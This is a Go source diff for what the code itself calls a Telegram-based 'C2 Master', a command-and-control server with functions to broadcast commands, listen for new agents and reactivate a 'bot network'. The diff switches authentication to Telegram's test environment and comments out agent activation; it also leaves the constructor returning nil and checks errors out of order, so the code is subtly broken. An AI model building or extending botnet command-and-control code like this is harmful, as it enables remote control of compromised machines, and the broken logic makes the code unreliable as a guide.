@@ -13,7 +13,7 @@ import (
 
 	"github.com/go-faster/errors"
 	telegram "github.com/gotd/td/telegram"
-	"github.com/gotd/td/telegram/auth"
+	"github.com/gotd/td/telegram/dcs"
 	"github.com/gotd/td/telegram/updates"
 	"github.com/gotd/td/tg"
 	"go.uber.org/zap"
@@ -40,10 +40,22 @@ type ITgC2 interface {
 
 func NewTgC2(c *config.Config) *TgC2 {
 	log.Println("Initiating new telegram client to act as C2 Master")
-	client := telegram.NewClient(c.ClientAPPID, c.ClientAPPHash, telegram.Options{})
 	logger, err := zap.NewDevelopment(zap.IncreaseLevel(zapcore.InfoLevel), zap.AddStacktrace(zapcore.FatalLevel))
 	if err != nil {
 		log.Fatalf("Error setting up logger for client")
+	}
+	var client *telegram.Client
+
+	if c.IsTestEnv() {
+		client = telegram.NewClient(telegram.TestAppID, telegram.TestAppHash, telegram.Options{
+			DCList: dcs.Test(),
+		})
+	} else {
+		client = telegram.NewClient(c.ClientAPPID, c.ClientAPPHash, telegram.Options{})
+	}
+
+	if err != nil {
+		log.Fatalf("Error setting up test client")
 	}
 
 	dispatcher := tg.NewUpdateDispatcher()
@@ -61,8 +73,7 @@ func NewTgC2(c *config.Config) *TgC2 {
 
 	c2.reactivateBotNetwork()
 	c2.ListenForNewAgents()
-
-	return c2
+	return nil
 }
 
 func (c2 *TgC2) BroadcastCommand(command string) error {
@@ -89,22 +100,16 @@ func (c2 *TgC2) ListenForNewAgents() error {
 	log.Printf("Running listener")
 	c2.client.Run(ctx, func(ctx context.Context) error {
 		// Perform auth if no session is available.
-		log.Println("Authenticating new client")
+		log.Println("Authenticating new client") // TODO: Create auth flow for production accounts
 
-		log.Println(config.Password)
-
-		authFlow := auth.NewFlow(
-			auth.Constant(config.Phone, config.Password, auth.CodeAuthenticatorFunc(codePrompt)),
-			auth.SendCodeOptions{},
-		)
-
-		if err := c2.client.Auth().IfNecessary(ctx, authFlow); err != nil {
-			log.Fatalln("Failed with error: %s", err)
-			return errors.Wrap(err, "auth")
+		err := c2.client.Auth().TestUser(ctx, config.Phone, 2)
+		if err != nil {
+			log.Fatalf("Error setting up test user %s", err)
 		}
+		user, err := c2.client.Self(ctx)
+		c2.logger.Info(fmt.Sprintf("Logged in with number %s", user.FirstName))
 
 		// Fetch user info.
-		user, err := c2.client.Self(ctx)
 		if err != nil {
 			log.Fatalf("Error getting self")
 			return errors.Wrap(err, "call self")
@@ -152,19 +157,7 @@ func (c2 *TgC2) reactivateBotNetwork() error {
 	totalAgents := len(agents)
 	activatedAgents := 0
 
-	// c2.client.Run(context.Background(), func(ctx context.Context) error {
-	// 	var wait sync.WaitGroup
-	// 	for _, agent := range agents {
-	// 		wait.Add(1)
-	// 		go func() {
-	// 			defer wait.Done()
-	// 			c2.activateAgent(agent)
-	// 			activatedAgents++
-	// 		}()
-	// 	}
-	// 	wait.Wait()
-	// 	return nil
-	// })
+	// TODO: Ping agents to see which ones are active
 
 	log.Printf("Network previously had %d agents\n", totalAgents)
 	log.Printf("Network activated with %d agents\n", activatedAgents)
